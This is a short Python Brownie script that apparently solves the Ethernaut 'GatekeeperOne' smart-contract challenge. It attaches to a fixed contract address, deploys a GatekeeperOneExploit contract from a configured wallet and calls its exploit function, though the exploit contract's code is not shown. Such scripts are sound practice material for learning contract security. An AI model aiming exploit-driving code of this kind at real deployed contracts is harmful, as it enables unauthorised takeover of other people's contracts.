from brownie import GatekeeperOne,GatekeeperOneExploit, config,accounts,web3

#input the contract address
#> contract.address
contractAddress = '0xb6e46fbB946CD4a49aEC5377a013F740fa06237C'
player = accounts.add(config["wallets"]["from_key"])

def solution():
    keeper = GatekeeperOne.at(contractAddress)
    exploit = GatekeeperOneExploit.deploy({"from":player})
    exploit.exploit(keeper.address,{"from":player})

    
def main():
    solution()